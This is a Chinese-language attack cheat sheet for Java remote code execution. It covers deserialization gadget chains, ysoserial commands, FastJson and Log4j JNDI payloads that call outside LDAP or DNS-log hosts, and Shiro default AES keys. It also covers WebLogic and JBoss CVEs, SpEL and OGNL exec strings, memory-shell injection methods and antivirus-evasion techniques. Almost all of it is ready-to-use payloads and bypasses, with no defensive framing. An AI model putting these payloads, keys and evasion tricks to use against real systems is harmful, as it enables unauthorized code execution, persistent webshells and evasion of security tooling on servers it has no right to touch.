# Java RCE 反序列化实战手册

## 1. 反序列化 Gadget Chains

### CommonsCollections 利用链速查
| 链 | JDK限制 | 关键类 |
|----|---------|--------|
| CC1 | JDK < 8u71 | AnnotationInvocationHandler + LazyMap |
| CC2 | 无限制 | PriorityQueue + TemplatesImpl (需commons-collections4) |
| CC3 | JDK < 8u71 | CC1 + TemplatesImpl动态加载字节码 |
| CC6 | **无限制** | HashMap + TiedMapEntry + LazyMap (最通用!) |
| CC7 | 无限制 | Hashtable + 哈希碰撞 |

ysoserial:
  java -jar ysoserial.jar CommonsCollections6 "curl dnslog.cn" | base64 -w0
  全部: CC1-7, CommonsBeanutils1, Jdk7u21, Jdk8u20, URLDNS, Click1, ROME, Spring1/2

### FastJson 反序列化
| 版本 | 利用方式 |
|------|----------|
| <= 1.2.24 | JdbcRowSetImpl JNDI / TemplatesImpl |
| 1.2.25-1.2.41 | autoType+L/绕过 |
| 1.2.47 | Class.class+cache通杀 |
| 1.2.68 | expectClass+AutoCloseable |
| 1.2.80 | 最新绕过链 |

1.2.47 payload: {"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://x:1389/Exp","autoCommit":true}}

### Shiro RememberMe 反序列化 (550)
检测: response Set-Cookie: rememberMe=deleteMe
Cookie: rememberMe=base64(IV_16+AES_CBC(payload))
常用key: kPH+bIxk5D2deZiIxcaaaA==, 4AvVhmFLUs0KTA3Kprsdag==, wGiHplamyXlVB11UXWol8g==
检测法: URLDNS gadget to dnslog 判定key是否有效
利用: CC6 -> 内存马/反弹shell

### WebLogic
| CVE | 描述 |
|-----|------|
| CVE-2023-21839 | T3/IIOP远程bind RCE |
| CVE-2020-14882/14883 | console未授权部署RCE |
| CVE-2017-10271 | wls-wsat XMLDecoder |
| CVE-2014-4210 | SSRF+T3探测 |
FOFA: app="BEA-WebLogic-Server"

### JBoss
CVE-2017-12149: JMXInvokerServlet反序列化
CVE-2017-7504: HTTPServerILServlet反序列化
JMX-Console未授权部署war

## 2. JNDI 注入
JDK<8u113: trustURLCodebase=true直接远程
JDK>=8u113: BeanFactory+EL / LDAP序列化 / 本地gadget

### Log4j2 (CVE-2021-44228)
Payload: ${jndi:ldap://x.x.x.x:1389/a}
WAF绕过: ${lower:j}ndi / ${::-j}${::-n}${::-d}${::-i} / ${env:BAR:-j}ndi / ${upper:jndi} / ${date:jndi}

## 3. SpEL/OGNL
Spring SpEL: T(java.lang.Runtime).getRuntime().exec("cmd")
Cloud Gateway: #{T(java.lang.Runtime).getRuntime().exec("cmd")}
Struts2: S2-045通杀 Content-Type OGNL注入

## 4. 内存马
Filter型(中): StandardContext->filterDefs+filterMaps
Servlet型(中): Wrapper注册
Valve型(高): Pipeline addValve
Controller型(高): RequestMappingHandlerMapping注册
Listener型(高): ServletRequestListener
Agent型(最高): Instrumentation.addTransformer

## 5. 回显链
Tomcat: Thread->Http11Processor->request/response
Spring: RequestContextHolder.getRequestAttributes()
WebLogic: SecurityContext->ContextManager->ExecuteThread

## 6. 免杀
BCEL类加载, Unsafe.defineClass, javassist动态生成, ScriptEngine多引擎, JNI/JNA, 字节码AES加密后解密defineClass

> 工具: ysoserial JNDIExploit marshalsec shiro_attack Godzilla/Behinder
